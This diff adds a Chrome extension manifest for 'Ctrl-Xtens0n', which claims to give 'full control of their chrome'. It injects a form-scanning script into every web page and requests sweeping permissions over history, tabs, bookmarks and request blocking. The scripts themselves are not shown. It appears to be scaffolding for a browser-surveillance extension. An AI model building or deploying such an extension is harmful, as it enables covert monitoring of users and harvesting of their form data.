@@ -1,0 +1,37 @@
+{
+  "manifest_version": 2,
+
+  "name": "Ctrl-Xtens0n",
+  "description": "This extension gives you full control of their chrome!",
+  "version": "1.0",
+
+  "content_scripts": [
+		{
+			"matches": ["http://*/*","https://*/*"],
+			"js": [
+				"/jquery-2.1.1.min.js", "getURL.js", "scanForms.js"
+			]
+		}
+	],
+
+  "background": {
+    "scripts": ["background.js"]
+  },
+
+  "permissions": [
+    "history",
+    "bookmarks",
+    "background",
+    "https://*/*",
+    "http://*/*",
+    "http://localhost/*",
+    "tabs",
+    "webRequest",
+    "webRequestBlocking",
+    "webNavigation",
+    "<all_urls>",
+    "activeTab",
+    "tabs"
+  ]
+}
+
